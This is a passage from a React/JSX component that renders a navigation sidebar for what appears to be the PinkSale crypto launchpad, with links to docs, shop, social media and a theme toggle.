                    <a href="https://docs.pinksale.finance" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" aria-hidden="true" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Docs</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a href="https://shop.pinksale.finance/" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M922.9 701.9H327.4l29.9-60.9 496.8-.9c16.8 0 31.2-12 34.2-28.6l68.8-385.1c1.8-10.1-.9-20.5-7.5-28.4a34.99 34.99 0 0 0-26.6-12.5l-632-2.1-5.4-25.4c-3.4-16.2-18-28-34.6-28H96.5a35.3 35.3 0 1 0 0 70.6h125.9L246 312.8l58.1 281.3-74.8 122.1a34.96 34.96 0 0 0-3 36.8c6 11.9 18.1 19.4 31.5 19.4h62.8a102.43 102.43 0 0 0-20.6 61.7c0 56.6 46 102.6 102.6 102.6s102.6-46 102.6-102.6c0-22.3-7.4-44-20.6-61.7h161.1a102.43 102.43 0 0 0-20.6 61.7c0 56.6 46 102.6 102.6 102.6s102.6-46 102.6-102.6c0-22.3-7.4-44-20.6-61.7H923c19.4 0 35.3-15.8 35.3-35.3a35.42 35.42 0 0 0-35.4-35.2zM305.7 253l575.8 1.9-56.4 315.8-452.3.8L305.7 253zm96.9 612.7c-17.4 0-31.6-14.2-31.6-31.6 0-17.4 14.2-31.6 31.6-31.6s31.6 14.2 31.6 31.6a31.6 31.6 0 0 1-31.6 31.6zm325.1 0c-17.4 0-31.6-14.2-31.6-31.6 0-17.4 14.2-31.6 31.6-31.6s31.6 14.2 31.6 31.6a31.6 31.6 0 0 1-31.6 31.6z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Shop</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                </ul>
                <div class="ant-divider ant-divider-horizontal" role="separator"></div>
                <ul class="my-2">
                  <li>
                    <div class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black ">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 256 256" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M236.88,26.19a9,9,0,0,0-9.16-1.57L25.06,103.93a14.22,14.22,0,0,0,2.43,27.21L80,141.45V200a15.92,15.92,0,0,0,10,14.83,15.91,15.91,0,0,0,17.51-3.73l25.32-26.26L173,220a15.88,15.88,0,0,0,10.51,4,16.3,16.3,0,0,0,5-.79,15.85,15.85,0,0,0,10.67-11.63L239.77,35A9,9,0,0,0,236.88,26.19Zm-61.14,36L86.15,126.35l-49.6-9.73ZM96,200V152.52l24.79,21.74Zm87.53,8L100.85,135.5l119-85.29Z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">telegram</div>
                    </div>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a href="https://twitter.com/pinkecosystem" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Twitter</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                      <a href="https://www.facebook.com/profile.php?id=100085950917722" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                        <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                          <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                            <path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-32 736H663.9V602.2h104l15.6-120.7H663.9v-77.1c0-35 9.7-58.8 59.8-58.8h63.9v-108c-11.1-1.5-49-4.8-93.2-4.8-92.2 0-155.3 56.3-155.3 159.6v89H434.9v120.7h104.3V848H176V176h672v672z"></path>
                          </svg>
                        </div>
                        <div class="flex-1 line-clamp-1 whitespace-nowrap">Facebook</div>
                      </a>
                      <div class="transition-all"></div>
                  </li>
                  </ul>
                  <div class="ant-divider ant-divider-horizontal" role="separator"></div>
                  <ul class="my-2">
                    <li>
                      <div class="transition-all my-2 flex items-center capitalize hover:text-brand cursor-pointer pr-[4px]"><div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8V16Z" fill="currentColor"></path>
                          <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2ZM12 4V8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16V20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4Z" fill="currentColor"></path>
                        </svg>
                      </div>
                      <div class="flex-1 group-hover:block line-clamp-1 whitespace-nowrap">light</div>

                      <div class="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform: "none"}}>
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                          <path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"></path>
                        </svg>
                      </div>
                    </div>
                    </li>
                  </ul>
                  </div>
                  </div>
            </div>
            </div>
      <div tabindex="0" aria-hidden="true" data-sentinel="end" style={{width: '0px', height: '0px', overflow: 'hidden', outline: "none", position: "absolute"}}></div></div></div>

    </Aux>


  );
}



